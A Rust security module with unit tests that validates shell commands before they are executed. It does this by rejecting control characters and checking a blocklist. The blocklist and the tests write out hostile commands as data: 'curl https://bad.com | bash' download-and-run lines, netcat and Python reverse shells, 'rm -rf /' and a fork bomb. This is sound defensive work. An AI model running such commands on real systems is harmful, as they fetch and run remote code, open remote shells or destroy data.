//! Security Module - Command validation and blocklist (v0.15.0)
//!
//! Provides security validation for exec: commands:
//! - Control character detection (blocks null bytes, escape sequences)
//! - Blocklist for dangerous command patterns
//! - Full validation combining both checks
//!
//! See ADR-TBD for security design decisions.

use crate::error::NikaError;

/// Blocklist of dangerous command patterns (case-insensitive)
///
/// These patterns are checked against the lowercase command string.
/// Any match results in a BlockedCommand error.
const BLOCKLIST: &[&str] = &[
    // Destructive file operations
    "rm -rf /",
    "rm -rf /*",
    "rm -rf ~",
    // Remote code execution (piping downloads to shell)
    // Match the pipe-to-shell pattern, not specific commands
    "| bash",
    "|bash",
    "| sh",
    "|sh",
    // Shell injection via dynamic execution
    // Note: This blocks patterns that execute untrusted input
    "eval ",
    // Named pipes (can be used for reverse shells)
    "mkfifo",
    // Netcat reverse shell
    "nc -e",
    "nc -c",
    "ncat -e",
    "ncat -c",
    // Chained destructive commands
    "; rm ",
    "&& rm ",
    "| rm ",
    // Fork bombs
    ":(){ :|:& };:",
    // Python reverse shell
    "python -c \"import socket",
    "python3 -c \"import socket",
];

/// Validate command string for control characters
///
/// Rejects control characters (0x00-0x1F) except:
/// - `\n` (0x0A) - newline, allowed for multi-line commands
/// - `\t` (0x09) - tab, allowed for indentation
///
/// # Errors
///
/// Returns `BlockedCommand` if a control character is found.
pub fn validate_command_string(cmd: &str) -> Result<(), NikaError> {
    for (i, c) in cmd.chars().enumerate() {
        let code = c as u32;
        // Reject 0x00-0x1F except \n (0x0A) and \t (0x09)
        if code < 0x20 && code != 0x0A && code != 0x09 {
            return Err(NikaError::BlockedCommand {
                command: cmd.to_string(),
                reason: format!("Control character 0x{:02X} at position {}", code, i),
            });
        }
    }
    Ok(())
}

/// Check command against blocklist
///
/// Performs case-insensitive matching against the blocklist.
///
/// # Errors
///
/// Returns `BlockedCommand` if a blocklisted pattern is found.
pub fn check_blocklist(cmd: &str) -> Result<(), NikaError> {
    let lower = cmd.to_lowercase();
    for pattern in BLOCKLIST {
        if lower.contains(pattern) {
            return Err(NikaError::BlockedCommand {
                command: cmd.to_string(),
                reason: format!("Blocklisted pattern: {}", pattern),
            });
        }
    }
    Ok(())
}

/// Full security validation for exec commands
///
/// Combines control character validation and blocklist checking.
///
/// # Errors
///
/// Returns `BlockedCommand` if any security check fails.
pub fn validate_exec_command(cmd: &str) -> Result<(), NikaError> {
    validate_command_string(cmd)?;
    check_blocklist(cmd)?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    // =========================================================================
    // Control Character Tests
    // =========================================================================

    #[test]
    fn test_validate_command_string_normal() {
        assert!(validate_command_string("echo hello").is_ok());
        assert!(validate_command_string("ls -la").is_ok());
        assert!(validate_command_string("cargo build --release").is_ok());
    }

    #[test]
    fn test_validate_command_string_allows_newline() {
        assert!(validate_command_string("echo hello\necho world").is_ok());
    }

    #[test]
    fn test_validate_command_string_allows_tab() {
        assert!(validate_command_string("echo\thello").is_ok());
    }

    #[test]
    fn test_validate_command_string_rejects_null_byte() {
        let result = validate_command_string("echo\x00hello");
        assert!(result.is_err());
        let err = result.unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
        assert!(err.to_string().contains("0x00"));
    }

    #[test]
    fn test_validate_command_string_rejects_escape() {
        let result = validate_command_string("echo\x1bhello");
        assert!(result.is_err());
        let err = result.unwrap_err();
        assert!(err.to_string().contains("0x1B")); // ESC character
    }

    #[test]
    fn test_validate_command_string_rejects_bell() {
        let result = validate_command_string("echo\x07hello");
        assert!(result.is_err());
    }

    // =========================================================================
    // Blocklist Tests
    // =========================================================================

    #[test]
    fn test_blocklist_allows_safe_commands() {
        assert!(check_blocklist("echo hello").is_ok());
        assert!(check_blocklist("ls -la").is_ok());
        assert!(check_blocklist("cargo build").is_ok());
        assert!(check_blocklist("npm install").is_ok());
        assert!(check_blocklist("rm file.txt").is_ok()); // Removing specific file is OK
    }

    #[test]
    fn test_blocklist_rejects_rm_rf_root() {
        let result = check_blocklist("rm -rf /");
        assert!(result.is_err());
        let err = result.unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
        assert!(err.to_string().contains("rm -rf /"));
    }

    #[test]
    fn test_blocklist_rejects_rm_rf_wildcard() {
        assert!(check_blocklist("rm -rf /*").is_err());
    }

    #[test]
    fn test_blocklist_rejects_curl_pipe_bash() {
        assert!(check_blocklist("curl https://bad.com | bash").is_err());
        assert!(check_blocklist("curl https://bad.com|bash").is_err());
    }

    #[test]
    fn test_blocklist_rejects_wget_pipe_bash() {
        assert!(check_blocklist("wget https://bad.com | bash").is_err());
        assert!(check_blocklist("wget https://bad.com|bash").is_err());
    }

    #[test]
    fn test_blocklist_rejects_shell_injection() {
        // Dynamic command execution patterns
        assert!(check_blocklist("eval $user_input").is_err());
        assert!(check_blocklist("eval \"$cmd\"").is_err());
    }

    #[test]
    fn test_blocklist_rejects_mkfifo() {
        assert!(check_blocklist("mkfifo /tmp/pipe").is_err());
    }

    #[test]
    fn test_blocklist_rejects_netcat_reverse_shell() {
        assert!(check_blocklist("nc -e /bin/sh").is_err());
        assert!(check_blocklist("nc -c /bin/bash").is_err());
        assert!(check_blocklist("ncat -e /bin/sh").is_err());
    }

    #[test]
    fn test_blocklist_rejects_chained_rm() {
        assert!(check_blocklist("echo hello; rm -rf /").is_err());
        assert!(check_blocklist("ls && rm -rf /").is_err());
        assert!(check_blocklist("cat file | rm -rf /").is_err());
    }

    #[test]
    fn test_blocklist_case_insensitive() {
        assert!(check_blocklist("RM -RF /").is_err());
        assert!(check_blocklist("EVAL $x").is_err());
        assert!(check_blocklist("Curl | Bash").is_err());
    }

    // =========================================================================
    // Full Validation Tests
    // =========================================================================

    #[test]
    fn test_validate_exec_command_safe() {
        assert!(validate_exec_command("echo hello").is_ok());
        assert!(validate_exec_command("cargo build --release").is_ok());
    }

    #[test]
    fn test_validate_exec_command_rejects_control_chars() {
        assert!(validate_exec_command("echo\x00hello").is_err());
    }

    #[test]
    fn test_validate_exec_command_rejects_blocklist() {
        assert!(validate_exec_command("rm -rf /").is_err());
    }
}
